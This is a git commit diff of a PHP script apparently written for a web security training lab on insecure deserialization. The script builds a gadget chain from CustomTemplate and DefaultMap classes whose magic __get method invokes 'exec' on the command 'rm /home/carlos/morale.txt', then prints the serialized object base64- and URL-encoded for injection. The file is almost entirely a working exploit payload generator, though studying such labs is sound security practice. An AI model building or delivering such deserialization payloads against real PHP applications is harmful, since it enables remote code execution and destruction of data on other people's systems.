e52150b9c57001c0033a2dafe7e915d65d6e8d58
tnt2402 <nguyenthanh24022002@gmail.com>
2023-11-20 14:51:16 +0700

    commit

--- challenge_5/lab09_payload/test.php
+++ challenge_5/lab09_payload/test.php
@@ -1,16 +1,38 @@
 <?php
-require_once 'CustomTemplate.php';
-// function sayHello 
+// require_once 'CustomTemplate.php';
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc;
+        $this->default_desc_type = $default_desc_type;
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this->callback, $name);
+    }
+}
+
 $callback = 'exec';
 $command = "rm /home/carlos/morale.txt";
-$CustomTemplate = new CustomTemplate();
-$CustomTemplate->desc 
 
-$ser = serialize($CustomTemplate);
+$defaultMap = new DefaultMap($callback);
+$customTemplate = new CustomTemplate($command, $defaultMap);
+$ser = serialize($customTemplate);
 echo($ser . "\n");
+
 echo("===================================================\n");
 echo("base64 endcoded then urlencoded: \n");
 echo(urlencode(base64_encode($ser)) . "\n");
 // echo $default_map->$sayHello_2 . "\n"; 
 ?>
-
